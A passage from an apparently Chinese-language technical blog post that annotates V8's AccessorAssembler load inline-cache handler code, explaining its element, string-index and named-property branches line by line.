class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::HandleLoadICSmiHandlerCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> LazyLoadICParameters* p, TNode&lt;Object&gt; holder, TNode&lt;Smi&gt; smi_handler,</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;Object&gt; handler, Label* miss, ExitPoint* exit_point, ICMode ic_mode,</span></span></span><br><span class="line"><span class="params"><span class="function">    OnNonExistent on_nonexistent, ElementSupport support_elements,</span></span></span><br><span class="line"><span class="params"><span class="function">    LoadAccessMode access_mode)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">TVARIABLE</span>(Float64T, var_double_value);</span><br><span class="line">  <span class="function">Label <span class="title">rebox_double</span><span class="params">(<span class="keyword">this</span>, &amp;var_double_value)</span></span>;</span><br><span class="line"></span><br><span class="line">  TNode&lt;IntPtrT&gt; handler_word = <span class="built_in">SmiUntag</span>(smi_handler); <span class="comment">// 算数右移</span></span><br><span class="line">  TNode&lt;IntPtrT&gt; handler_kind =</span><br><span class="line">      <span class="built_in">Signed</span>(<span class="built_in">DecodeWord</span>&lt;LoadHandler::KindBits&gt;(handler_word)); <span class="comment">// 解码</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (support_elements == kSupportElements) &#123;</span><br><span class="line">    <span class="function">Label <span class="title">if_element</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">if_indexed_string</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">if_property</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">        <span class="title">if_hole</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">unimplemented_elements_kind</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">        <span class="title">if_oob</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span>, <span class="title">try_string_to_array_index</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">        <span class="title">emit_element_load</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(IntPtrT, var_intptr_index);</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kElement)), <span class="comment">// 当handle的类型为kElement的时候，跳到if_element</span></span><br><span class="line">           &amp;if_element);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (access_mode == LoadAccessMode::kHas) &#123; <span class="comment">// 当访问模式是kHas的时候</span></span><br><span class="line">      <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>,</span><br><span class="line">                 <span class="built_in">WordNotEqual</span>(handler_kind,</span><br><span class="line">                              <span class="built_in">IntPtrConstant</span>(LoadHandler::kIndexedString)));</span><br><span class="line">      <span class="built_in">Goto</span>(&amp;if_property); <span class="comment">// 当handler_kind不是kIndexedString的时候跳到if_property</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">Branch</span>(</span><br><span class="line">          <span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kIndexedString)),</span><br><span class="line">          &amp;if_indexed_string, &amp;if_property); <span class="comment">// 当handler_kind是kIndexedString的时候跳到if_indexed_string，否则跳到if_property</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;if_element);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">Comment</span>(<span class="string">&quot;element_load&quot;</span>);</span><br><span class="line">      <span class="built_in">TVARIABLE</span>(Int32T, var_instance_type);</span><br><span class="line">      TNode&lt;IntPtrT&gt; intptr_index = <span class="built_in">TryToIntptr</span>(</span><br><span class="line">          p-&gt;<span class="built_in">name</span>(), &amp;try_string_to_array_index, &amp;var_instance_type);</span><br><span class="line">      var_intptr_index = intptr_index; <span class="comment">// 获取index的int指针</span></span><br><span class="line">      <span class="built_in">Goto</span>(&amp;emit_element_load); <span class="comment">// 跳到emit_element_load</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;try_string_to_array_index);</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">GotoIfNot</span>(<span class="built_in">IsStringInstanceType</span>(var_instance_type.<span class="built_in">value</span>()), miss); <span class="comment">// 当var_instance_type不是string的实例的时候跳到miss</span></span><br><span class="line"></span><br><span class="line">        TNode&lt;ExternalReference&gt; function = <span class="built_in">ExternalConstant</span>(</span><br><span class="line">            ExternalReference::<span class="built_in">string_to_array_index_function</span>());</span><br><span class="line">        TNode&lt;Int32T&gt; result = <span class="built_in">UncheckedCast</span>&lt;Int32T&gt;(</span><br><span class="line">            <span class="built_in">CallCFunction</span>(function, MachineType::<span class="built_in">Int32</span>(),</span><br><span class="line">                          std::<span class="built_in">make_pair</span>(MachineType::<span class="built_in">AnyTagged</span>(), p-&gt;<span class="built_in">name</span>()))); <span class="comment">// 将string转为数组的index</span></span><br><span class="line">        <span class="built_in">GotoIf</span>(<span class="built_in">Word32Equal</span>(<span class="built_in">Int32Constant</span>(<span class="number">-1</span>), result), miss); <span class="comment">// 当转换失败，跳到miss</span></span><br><span class="line">        <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">Int32GreaterThanOrEqual</span>(result, <span class="built_in">Int32Constant</span>(<span class="number">0</span>)));</span><br><span class="line">        var_intptr_index = <span class="built_in">ChangeInt32ToIntPtr</span>(result); <span class="comment">// 获取index的int指针</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">Goto</span>(&amp;emit_element_load); <span class="comment">// 跳到emit_element_load</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;emit_element_load);</span><br><span class="line">      &#123;</span><br><span class="line">        TNode&lt;BoolT&gt; is_jsarray_condition =</span><br><span class="line">            <span class="built_in">IsSetWord</span>&lt;LoadHandler::IsJsArrayBits&gt;(handler_word); <span class="comment">// 当handler_word是set的操作的时候</span></span><br><span class="line">        TNode&lt;Uint32T&gt; elements_kind =</span><br><span class="line">            <span class="built_in">DecodeWord32FromWord</span>&lt;LoadHandler::ElementsKindBits&gt;(handler_word); <span class="comment">// 解码得到elements_kind</span></span><br><span class="line">        <span class="built_in">ElementLoad</span>(<span class="built_in">CAST</span>(holder), elements_kind, var_intptr_index.<span class="built_in">value</span>(),</span><br><span class="line">                        is_jsarray_condition, &amp;if_hole, &amp;rebox_double,</span><br><span class="line">                        &amp;var_double_value, &amp;unimplemented_elements_kind,</span><br><span class="line">                        &amp;if_oob, miss, exit_point, access_mode); <span class="comment">// 进行element的load操作，如果越界读取则跳到if_oob</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;unimplemented_elements_kind); <span class="comment">// 当出现了不支持的情况，断点触发并跳到miss</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Smi handlers should only be installed for supported elements kinds.</span></span><br><span class="line">      <span class="comment">// Crash if we get here.</span></span><br><span class="line">      <span class="built_in">DebugBreak</span>();</span><br><span class="line">      <span class="built_in">Goto</span>(miss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;if_oob);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">Comment</span>(<span class="string">&quot;out of bounds elements access&quot;</span>);</span><br><span class="line">      <span class="function">Label <span class="title">return_undefined</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Check if we&#x27;re allowed to handle OOB accesses.</span></span><br><span class="line">      TNode&lt;BoolT&gt; allow_out_of_bounds =</span><br><span class="line">          <span class="built_in">IsSetWord</span>&lt;LoadHandler::AllowOutOfBoundsBits&gt;(handler_word); <span class="comment">// 检查是否允许OOB访问</span></span><br><span class="line">      <span class="built_in">GotoIfNot</span>(allow_out_of_bounds, miss); <span class="comment">// 不允许，跳到miss</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// Negative indices aren&#x27;t valid array indices (according to</span></span><br><span class="line">      <span class="comment">// the ECMAScript specification), and are stored as properties</span></span><br><span class="line">      <span class="comment">// in V8, not elements. So we cannot handle them here, except</span></span><br><span class="line">      <span class="comment">// in case of typed arrays, where integer indexed properties</span></span><br><span class="line">      <span class="comment">// aren&#x27;t looked up in the prototype chain.</span></span><br><span class="line">      <span class="built_in">GotoIf</span>(<span class="built_in">IsJSTypedArray</span>(<span class="built_in">CAST</span>(holder)), &amp;return_undefined);</span><br><span class="line">      <span class="keyword">if</span> (<span class="built_in">Is64</span>()) &#123;</span><br><span class="line">        <span class="built_in">GotoIfNot</span>(</span><br><span class="line">            <span class="built_in">UintPtrLessThanOrEqual</span>(var_intptr_index.<span class="built_in">value</span>(),</span><br><span class="line">                                   <span class="built_in">IntPtrConstant</span>(JSArray::kMaxArrayIndex)),</span><br><span class="line">            miss); <span class="comment">// 当index大于kMaxArrayIndex，跳到miss</span></span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">GotoIf</span>(<span class="built_in">IntPtrLessThan</span>(var_intptr_index.<span class="built_in">value</span>(), <span class="built_in">IntPtrConstant</span>(<span class="number">0</span>)),</span><br><span class="line">               miss); <span class="comment">// 当index为负数且小于0，跳到miss</span></span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// For all other receivers we need to check that the prototype chain</span></span><br><span class="line">      <span class="comment">// doesn&#x27;t contain any elements.</span></span><br><span class="line">      <span class="built_in">BranchIfPrototypesHaveNoElements</span>(<span class="built_in">LoadMap</span>(<span class="built_in">CAST</span>(holder)), &amp;return_undefined,</span><br><span class="line">                                       miss); <span class="comment">// 检查原型链是否含有元素，没有的话就跳到return_undefined，有的话就跳到miss</span></span><br><span class="line"></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;return_undefined);</span><br><span class="line">      exit_point-&gt;<span class="built_in">Return</span>(access_mode == LoadAccessMode::kHas</span><br><span class="line">                             ? <span class="built_in">FalseConstant</span>()</span><br><span class="line">                             : <span class="built_in">UndefinedConstant</span>()); <span class="comment">// 当访问模式为kHas的时候，没有元素返回false，否则返回undefined</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;if_hole);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">Comment</span>(<span class="string">&quot;convert hole&quot;</span>);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">GotoIfNot</span>(<span class="built_in">IsSetWord</span>&lt;LoadHandler::ConvertHoleBits&gt;(handler_word), miss); <span class="comment">// 当handle不是set的操作，跳到miss</span></span><br><span class="line">      <span class="built_in">GotoIf</span>(<span class="built_in">IsNoElementsProtectorCellInvalid</span>(), miss); </span><br><span class="line">      exit_point-&gt;<span class="built_in">Return</span>(access_mode == LoadAccessMode::kHas</span><br><span class="line">                             ? <span class="built_in">FalseConstant</span>()</span><br><span class="line">                             : <span class="built_in">UndefinedConstant</span>()); <span class="comment">// 当访问模式为kHas的时候，没有元素返回false，否则返回undefined</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (access_mode != LoadAccessMode::kHas) &#123; <span class="comment">// 当访问模式不是kHas的时候</span></span><br><span class="line">      <span class="built_in">BIND</span>(&amp;if_indexed_string);</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">if_oob</span><span class="params">(<span class="keyword">this</span>, Label::kDeferred)</span></span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">Comment</span>(<span class="string">&quot;indexed string&quot;</span>);</span><br><span class="line">        TNode&lt;String&gt; string_holder = <span class="built_in">CAST</span>(holder);</span><br><span class="line">        TNode&lt;UintPtrT&gt; index = <span class="built_in">Unsigned</span>(<span class="built_in">TryToIntptr</span>(p-&gt;<span class="built_in">name</span>(), miss)); <span class="comment">// 访问的对象转为index</span></span><br><span class="line">        TNode&lt;UintPtrT&gt; length =</span><br><span class="line">            <span class="built_in">Unsigned</span>(<span class="built_in">LoadStringLengthAsWord</span>(string_holder)); <span class="comment">// 获取string_holder的字符长度</span></span><br><span class="line">        <span class="built_in">GotoIf</span>(<span class="built_in">UintPtrGreaterThanOrEqual</span>(index, length), &amp;if_oob); <span class="comment">// 当index大于length的时候，跳到if_oob</span></span><br><span class="line">        TNode&lt;Int32T&gt; code = <span class="built_in">StringCharCodeAt</span>(string_holder, index); <span class="comment">// 找到code at的code</span></span><br><span class="line">        TNode&lt;String&gt; result = <span class="built_in">StringFromSingleCharCode</span>(code); <span class="comment">// 得到result</span></span><br><span class="line">        <span class="built_in">Return</span>(result); <span class="comment">// 返回</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">BIND</span>(&amp;if_oob);</span><br><span class="line">        TNode&lt;BoolT&gt; allow_out_of_bounds =</span><br><span class="line">            <span class="built_in">IsSetWord</span>&lt;LoadHandler::AllowOutOfBoundsBits&gt;(handler_word);</span><br><span class="line">        <span class="built_in">GotoIfNot</span>(allow_out_of_bounds, miss);</span><br><span class="line">        <span class="built_in">GotoIf</span>(<span class="built_in">IsNoElementsProtectorCellInvalid</span>(), miss);</span><br><span class="line">        <span class="built_in">Return</span>(<span class="built_in">UndefinedConstant</span>());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;if_property);</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;property_load&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (access_mode == LoadAccessMode::kHas) &#123;</span><br><span class="line">    <span class="built_in">HandleLoadICSmiHandlerHasNamedCase</span>(p, holder, handler_kind, miss,</span><br><span class="line">                                       exit_point, ic_mode);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">HandleLoadICSmiHandlerLoadNamedCase</span>(</span><br><span class="line">        p, holder, handler_kind, handler_word, &amp;rebox_double, &amp;var_double_value,</span><br><span class="line">        handler, miss, exit_point, ic_mode, on_nonexistent, support_elements);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主要针对比较通常的部分进行了实现，同时对 <code>NamedCase</code> 进行了更加细化的操作，分别使用了 <code>HandleLoadICSmiHandlerHasNamedCase</code> 和 <code>HandleLoadICSmiHandlerLoadNamedCase</code></p>
<p><code>AccessorAssembler::HandleLoadICSmiHandlerHasNamedCase</code> 中主要针对不同的情况进行了判断，比较好理解</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">AccessorAssembler::HandleLoadICSmiHandlerHasNamedCase</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> LazyLoadICParameters* p, TNode&lt;Object&gt; holder,</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;IntPtrT&gt; handler_kind, Label* miss, ExitPoint* exit_point,</span></span></span><br><span class="line"><span class="params"><span class="function">    ICMode ic_mode)</span> </span>&#123;</span><br><span class="line">  <span class="function">Label <span class="title">return_true</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">return_false</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">return_lookup</span><span class="params">(<span class="keyword">this</span>)</span>,</span></span><br><span class="line"><span class="function">      <span class="title">normal</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">global</span><span class="params">(<span class="keyword">this</span>)</span>, <span class="title">slow</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kField)),</span><br><span class="line">         &amp;return_true);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind,</span><br><span class="line">                   <span class="built_in">IntPtrConstant</span>(LoadHandler::kConstantFromPrototype)),</span><br><span class="line">         &amp;return_true);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kNonExistent)),</span><br><span class="line">         &amp;return_false);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kNormal)),</span><br><span class="line">         &amp;normal);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kAccessor)),</span><br><span class="line">         &amp;return_true);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(</span><br><span class="line">      <span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kNativeDataProperty)),</span><br><span class="line">      &amp;return_true);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kApiGetter)),</span><br><span class="line">         &amp;return_true);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind,</span><br><span class="line">                   <span class="built_in">IntPtrConstant</span>(LoadHandler::kApiGetterHolderIsPrototype)),</span><br><span class="line">         &amp;return_true);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kSlow)), &amp;slow);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">Branch</span>(<span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kGlobal)), &amp;global,</span><br><span class="line">         &amp;return_lookup);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;return_true);</span><br><span class="line">  exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;return_false);</span><br><span class="line">  exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">FalseConstant</span>());</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;return_lookup);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(</span><br><span class="line">        <span class="keyword">this</span>,</span><br><span class="line">        <span class="built_in">Word32Or</span>(</span><br><span class="line">            <span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kInterceptor)),</span><br><span class="line">            <span class="built_in">Word32Or</span>(</span><br><span class="line">                <span class="built_in">WordEqual</span>(handler_kind, <span class="built_in">IntPtrConstant</span>(LoadHandler::kProxy)),</span><br><span class="line">                <span class="built_in">WordEqual</span>(handler_kind,</span><br><span class="line">                          <span class="built_in">IntPtrConstant</span>(LoadHandler::kModuleExport)))));</span><br><span class="line">    exit_point-&gt;<span class="built_in">ReturnCallStub</span>(</span><br><span class="line">        Builtins::<span class="built_in">CallableFor</span>(<span class="built_in">isolate</span>(), Builtins::kHasProperty), p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">        p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;normal);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;has_normal&quot;</span>);</span><br><span class="line">    TNode&lt;NameDictionary&gt; properties = <span class="built_in">CAST</span>(<span class="built_in">LoadSlowProperties</span>(<span class="built_in">CAST</span>(holder)));</span><br><span class="line">    <span class="built_in">TVARIABLE</span>(IntPtrT, var_name_index);</span><br><span class="line">    <span class="function">Label <span class="title">found</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">    <span class="built_in">NameDictionaryLookup</span>&lt;NameDictionary&gt;(properties, <span class="built_in">CAST</span>(p-&gt;<span class="built_in">name</span>()), &amp;found,</span><br><span class="line">                                         &amp;var_name_index, miss);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">BIND</span>(&amp;found);</span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;global);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsPropertyCell</span>(<span class="built_in">CAST</span>(holder)));</span><br><span class="line">    <span class="comment">// Ensure the property cell doesn&#x27;t contain the hole.</span></span><br><span class="line">    TNode&lt;Object&gt; value =</span><br><span class="line">        <span class="built_in">LoadObjectField</span>(<span class="built_in">CAST</span>(holder), PropertyCell::kValueOffset);</span><br><span class="line">    <span class="built_in">GotoIf</span>(<span class="built_in">IsTheHole</span>(value), miss);</span><br><span class="line"></span><br><span class="line">    exit_point-&gt;<span class="built_in">Return</span>(<span class="built_in">TrueConstant</span>());</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;slow);</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">Comment</span>(<span class="string">&quot;load_slow&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ic_mode == ICMode::kGlobalIC) &#123;</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kLoadGlobalIC_Slow, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                    p-&gt;<span class="built_in">name</span>(), p-&gt;<span class="built_in">slot</span>(), p-&gt;<span class="built_in">vector</span>());</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      exit_point-&gt;<span class="built_in">ReturnCallRuntime</span>(Runtime::kHasProperty, p-&gt;<span class="built_in">context</span>(),</span><br><span class="line">                                    p-&gt;<span class="built_in">receiver</span>(), p-&gt;<span class="built_in">name</span>());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>AccessorAssembler::HandleLoadICSmiHandlerLoadNamedCase</code> 同样，也是针对各个情况进行了分别的处理，这里不再赘述</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span 